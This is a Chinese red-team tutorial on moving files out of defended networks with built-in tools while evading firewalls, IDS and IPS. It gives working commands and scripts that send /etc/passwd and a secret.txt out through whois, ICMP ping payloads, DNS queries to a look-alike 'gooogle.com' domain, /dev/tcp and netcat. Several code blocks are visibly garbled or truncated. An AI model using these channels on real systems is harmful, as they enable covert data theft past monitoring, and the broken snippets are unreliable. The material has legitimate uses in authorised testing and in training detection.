**作者：xax007@知道创宇404 ScanV安全服务团队  
作者博客：**
在红队渗透测试当中往往需要最大化利用当前的环境绕过重兵防守的系统的防火墙、IDS、IPS等报警和监控系统进行文件传输，本文列出了多种利用操作系统默认自带的工具进行文件传输的方法。
## 搭建 HTTP server
### Python
python2:
    python -m SimpleHTTPServer 1337
以上命令会在当前目录启动 HTTP 服务，端口为 1337
python3:
    python -m http.server 1337
以上命令会在当前目录启动 HTTP 服务，端口为 1337
### PHP 5.4+
当 PHP 版本大于 5.4 是，可使用 PHP 在当前目录启动 HTTP 服务，端口为 1337
    php -S 0.0.0.0:1337
### Ruby
下面的命令会在当前目录下启动 HTTP 服务，端口为 1337
    ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'
### Ruby 1.9.2+
    ruby -run -e httpd . -p 1337
### Perl
    perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'
    perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0]  0)
          print $0
      close(HTTPCon)
    }'
效果：
## Setup HTTP PUT server
以下列出了上传文件到 HTTP Server 的几种方法
### 使用 Nginx 搭建 HTTP PUT Server
    mkdir -p /var/www/upload/ # 创建目录 
    chown www-data:www-data /var/www/upload/ # 修改目录所属用户和组
    cd /etc/nginx/sites-available # 进入 nginx 虚拟主机目录
    # 写入配置到 file_upload 文件
    cat  file_upload
    server {
        listen 8001 default_server;
        server_name kali;
            location / {
            root /var/www/upload;
            dav_methods PUT;
        }
    }
    EOF
    # 写入完毕
    cd ../sites-enable # 进入 nginx 虚拟主机启动目录
    ln -s /etc/nginx/sites-available/file_upload file_upload # 启用 file_upload 虚拟主机
    systemctl start nginx # 启动 Nginx
### 使用 Python 搭建 HTTP PUT Server
以下代码保存到 `HTTPutServer.py` 文件里:
    # ref: https://www.snip2code.com/Snippet/905666/Python-HTTP-PUT-test-server
    import sys
    import signal
    from threading import Thread
    from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
    class PUTHandler(BaseHTTPRequestHandler):
        def do_PUT(self):
            length = int(self.headers['Content-Length'])
            content = self.rfile.read(length)
            self.send_response(200)
            with open(self.path[1:], "w") as f:
                f.write(content)
    def run_on(port):
        print("Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...".format(sys.argv[1], port))
        server_address = (sys.argv[1], port)
        httpd = HTTPServer(server_address, PUTHandler)
        httpd.serve_forever()
    if __name__ == "__main__":
        if len(sys.argv)  secret.txt 
文件发送端:
    cat secret.txt > /dev/tcp/ip/port
## 使用 SMB 协议进行文件传输
### 搭建简易 SMB Server
搭建简易SMB Server 需要用到 [Impacket](https://github.com/SecureAuthCorp/impacket) 项目的
`smbserver.py` 文件
`Impacket` 已默认安装在 Kali Linux 系统中
**syntax:** `impacker-smbserver ShareName SharePath`
    $ mkdir smb # 创建 smb 目录
    $ cd smb # 进入 smb目录
    $ impacket-smbserver share `pwd` # 在当前目录启动 SMB server，共享名称为 share
效果：
#### 从 SMB server 下载文件
    copy \\IP\ShareName\file.exe file.exe
#### 上传文件到 SMB server
    net use x: \\IP\ShareName
    copy file.txt x:
    net use x: /delete
### 使用 whois 命令进行文件传输
/etc/passwd
Host A
Host B
接收端 Host B：
    nc -vlnp 1337 | sed "s/ //g" | base64 -d 
发送端 Host A：
    whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64` 
效果：
### 使用 ping 命令进行文件传输
secret.txt
Sender
Reciver
发送端:
    xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
接收端:
以下代码保存到 `ping_receiver.py`
    import sys
    try:
        from scapy.all import *
    except:
        print("Scapy not found, please install scapy: pip install scapy")
        sys.exit(0)
    def process_packet(pkt):
        if pkt.haslayer(ICMP):
            if pkt[ICMP].type == 8:
                data = pkt[ICMP].load[-4:]
                print(f'{data.decode("utf-8")}', flush=True, end="", sep="")
    sniff(iface="eth0", prn=process_packet)
执行方法:
    python3 ping_receiver.py
效果
![
](https://images.seebug.org/content/images/2019/03/954b14a9-94a3-4cc7-bc1d-b2a7517f2a67.png-w331s)
### 使用 dig 命令进行文件传输
/etc/passwd
Sender
Reciver
发送端:
    xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done
接收端:
以下代码使用了 python 的 `scapy` 模块，需要手动安装
代码保存到 `dns_reciver.py` 文件中
    try:
        from scapy.all import *
    except:
        print("Scapy not found, please install scapy: pip install scapy")
    def process_packet(pkt):
        if pkt.haslayer(DNS):
            domain = pkt[DNS][DNSQR].qname.decode('utf-8')
            root_domain = domain.split('.')[1]
            if root_domain.startswith('gooogle'):
                print(f'{bytearray.fromhex(domain[:-13]).decode("utf-8")}', flush=True, end='')
    sniff(iface="eth0", prn=process_packet)
运行方法:
    python3 dns_reciver.py
效果：
![Transfer files via
dig](https://images.seebug.org/content/images/2019/03/05/1551770390000-2019-01-13-143819-1551770338400.png-w331s)
## 使用 NetCat 进行文件传输
1.txt
A:10.10.10.100
B:10.10.10.200
接受端:
    nc -l -p 1337 > 1.txt
发送端：
    cat 1.txt | nc -l -p 1337
或者
    nc 10.10.10.200 1337  1.txt
## 参考链接
  * Ippsec’s [HackTheBox - Mischief](https://www.youtube.com/watch?v=GKo6xoB1g4Q&t=2430s) Video
  * [Micropoor](https://paper.seebug.org/820/)
  * [Simple Local HTTP Server With Ruby](http://sweetme.at/2013/08/28/simple-local-http-server-with-ruby/)
  * [Big list of http static server one liners](https://gist.github.com/willurd/5720255)
  * [渗透技巧——从github下载文件的多种方法](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/)
* * *